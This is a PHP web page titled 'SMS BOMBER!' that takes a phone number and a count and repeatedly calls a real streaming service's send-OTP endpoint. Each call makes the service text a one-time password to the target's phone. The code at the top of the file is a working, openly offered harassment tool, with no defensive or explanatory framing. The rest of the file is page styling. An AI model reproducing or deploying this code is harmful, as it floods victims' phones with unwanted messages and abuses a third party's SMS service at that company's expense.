<?php
session_start();
if(isset($_POST['submit'])){
	$number = $_POST['number'];
	$amount = $_POST['amount'];
	if($amount > 20 or $amount < 0){
		$_SESSION['alert'] = '<div class="alert alert-danger alert-white rounded"><div class="icon"><i class="fa fa-times-circle"></i></div><strong>Maximum amount is 20!</strong></div><br>';
	}else{
		for($i=0; $i < $amount; $i++){ 
			$url = "https://stage.bioscopelive.com/en/login/send-otp?phone=88".$number."&operator=bd-otp";
			$cSession = curl_init();
			curl_setopt($cSession,CURLOPT_URL,$url);
			curl_setopt($cSession,CURLOPT_RETURNTRANSFER,true);
			curl_setopt($cSession,CURLOPT_HEADER, false);
			$result = curl_exec($cSession);
			$http_code = curl_getinfo($cSession, CURLINFO_HTTP_CODE);
			curl_close($cSession);
		}
	}
	if(empty($http_code)){
		$http_code = "408";
	}
	if($http_code == 200){
		$_SESSION['alert'] = '<div class="alert alert-success alert-white rounded"><div class="icon"><i class="fa fa-check"></i></div><strong>Success!</strong></div><br>';
	}else{
		$_SESSION['alert'] = '<div class="alert alert-danger alert-white rounded"><div class="icon"><i class="fa fa-times-circle"></i></div><strong>Failed! Error code: '.$http_code.'</strong></div><br>';
	}
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>SMS BOMBER!</title>
	<meta name="viewport" content="width=device-width, user-scalable=no"/>
	<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
	<style>
		*{
			padding: 0;
			margin: 0;
		}
		body{
			background: #5cb85c;
		}
		.container{
			max-width: 290px;
			padding: 50px 30px;
			background: #ffffff;
			margin: 10% auto;
			text-align: center;
			box-shadow: 0 2px 26px 0 #6F6F6F, 0 2px 26px 0 #6f6f6f;
		}
		input{
			width: 90%;
			height: 20px;
			display: inline-block;
			outline: 0;
			border: 0;
			padding: 5px;
			border-bottom: 3px solid #5cb85c;
		}
		input:focus{
			border-bottom: 3px solid #d9534f;
			transition: .5s;
		}
		.button{
			height: 35px;
			width: 95%;
			background: #5cb85c;
			border: 0;
			color: #FFFFFF;
			font-weight: bold;
			padding: 7px 13px;
			outline: 0;
			text-decoration: none;
		}
		.button:hover{
			background: #d9534f;		
			outline: 0;
		}
		.bless{
			font-size: 13px;
			color: #FF0081;
			font-family: "Times new Roman";
		}
		h2{
			color: #5cb85c;
			font-family: "Times new Roman";
		}
		.close {
		    float: right;
		    font-size: 21px;
		    font-weight: bold;
		    line-height: 1;
		    color: #000;
		    text-shadow: 0 1px 0 #fff;
		    opacity: .2;
		}

		.close:hover,.close:focus {
		    color: #000;
		    text-decoration: none;
		    cursor: pointer;
		    opacity: .5;
		}

		button.close {
		    padding: 0;
		    cursor: pointer;
		    background: transparent;
		    border: 0;
		    -webkit-appearance: none;
		}

		.alert {
		    padding: 15px;
		    width: 67%;
		    margin: auto;
		    border: 1px solid transparent;
		    border-radius: 4px;
		}

		.alert h4 {
		    margin-top: 0;
		    color: inherit;
		}

		.alert .alert-link {
		    font-weight: bold;
		}

		.alert>p,.alert>ul {
		    margin-bottom: 0;
		}

		.alert>p+p {
		    margin-top: 5px;
		}

		.alert-dismissable {
		    padding-right: 35px;
		}

		.alert-dismissable .close {
		    position: relative;
		    top: -2px;
		    right: -21px;
		    color: inherit;
		}

		.alert-success {
		    background-color: #dff0d8;
		    border-color: #d6e9c6;
		    color: #3c763d;
		}

		.alert-success hr {
		    border-top-color: #c9e2b3;
		}

		.alert-success .alert-link {
		    color: #2b542c;
		}

		.alert-info {
		    background-color: #d9edf7;
		    border-color: #bce8f1;
		    color: #31708f;
		}

		.alert-info hr {
		    border-top-color: #a6e1ec;
		}

		.alert-info .alert-link {
		    color: #245269;
		}

		.alert-warning {
		    background-color: #fcf8e3;
		    border-color: #faebcc;
		    color: #8a6d3b;
		}

		.alert-warning hr {
		    border-top-color: #f7e1b5;
		}

		.alert-warning .alert-link {
		    color: #66512c;
		}

		.alert-danger {
		    background-color: #f2dede;
		    border-color: #ebccd1;
		    color: #a94442;
		}

		.alert-danger hr {
		    border-top-color: #e4b9c0;
		}

		.alert-danger .alert-link {
		    color: #843534;
		}

		.alert {
		    border-radius: 0;
		    -webkit-border-radius: 0;
		    box-shadow: 0 1px 2px rgba(0,0,0,0.11);
		}

		.alert .sign {
		    font-size: 20px;
		    vertical-align: middle;
		    margin-right: 5px;
		    text-align: center;
		    width: 25px;
		    display: inline-block;
		}

		.alert-success {
		    background-color: #dbf6d3;
		    border-color: #aed4a5;
		    color: #569745;
		}

		.alert-info {
		    background-color: #d9edf7;
		    border-color: #98cce6;
		    color: #3a87ad;
		}

		.alert-warning {
		    background-color: #fcf8e3;
		    border-color: #f1daab;
		    color: #c09853;
		}

		.alert-danger {
		    background-color: #f2dede;
		    border-color: #e0b1b8;
		    color: #b94a48;
		}

		.alert-white {
		    background-image: linear-gradient(to bottom,#FFFFFF,#F9F9F9);
		    border-top-color: #d8d8d8;
		    border-bottom-color: #bdbdbd;
		    border-left-color: #cacaca;
		    border-right-color: #cacaca;
		    color: #404040;
		    padding-left: 61px;
		    position: relative;
		}

		.alert-white .icon {
		    text-align: center;
		    width: 45px;
		    height: 100%;
		    position: absolute;
		    top: -1px;
		    left: -1px;
		    border: 1px solid #bdbdbd;
		}

		.alert-white .icon:after {
		    -webkit-transform: rotate(45deg);
		    -moz-transform: rotate(45deg);
		    -ms-transform: rotate(45deg);
		    -o-transform: rotate(45deg);
		    -webkit-transform: rotate(45deg);
		    display: block;
		    content: '';
		    width: 10px;
		    height: 10px;
		    border: 1px solid #bdbdbd;
		    position: absolute;
		    border-left: 0;
		    border-bottom: 0;
		    top: 50%;
		    right: -6px;
		    margin-top: -5px;
		    background: #fff;
		}

		.alert-white.rounded {
		    border-radius: 3px;
		    -webkit-border-radius: 3px;
		}

		.alert-white.rounded .icon {
		    border-radius: 3px 0 0 3px;
		    -webkit-border-radius: 3px 0 0 3px;
		}

		.alert-white .icon i {
		    font-size: 20px;
		    color: #FFF;
		    left: 12px;
		    margin-top: -10px;
		    position: absolute;
		    top: 50%;
		}

		.alert-white.alert-danger .icon,.alert-white.alert-danger .icon:after {
		    border-color: #ca452e;
		    background: #da4932;
		}

		.alert-white.alert-info .icon,.alert-white.alert-info .icon:after {
		    border-color: #3a8ace;
		    background: #4d90fd;
		}

		.alert-white.alert-warning .icon,.alert-white.alert-warning .icon:after {
		    border-color: #d68000;
		    background: #fc9700;
		}

		.alert-white.alert-success .icon,.alert-white.alert-success .icon:after {
		    border-color: #54a754;
		    background: #60c060;
		}
	</style>
</head>
<body>
	<div class="container">
		<form method="POST">
			<h2>SMS BOMBER!</h2>
			<br>
			<?php
			if(isset($_SESSION['alert'])){
				echo $_SESSION['alert'];
			}
			if(!isset($_SESSION['alert'])){
			?>
			<input type="number" name="number" placeholder="Number(ex. 01XXXXXXXXX)" autocomplete="off">
			<br><br>
			<input type="number" name="amount" placeholder="Amount(Max. 20)" autocomplete="off">
			<br><br>
			<input type="submit" name="submit" value="BOOM!" class="button">
		<?php }else{
			?>
			<a href="index.php" class="button">TRY AGAIN!</a>
			<?php
		}
			$_SESSION['alert'] = null;
		?>
		</form>
	</div>
</body>
</html>
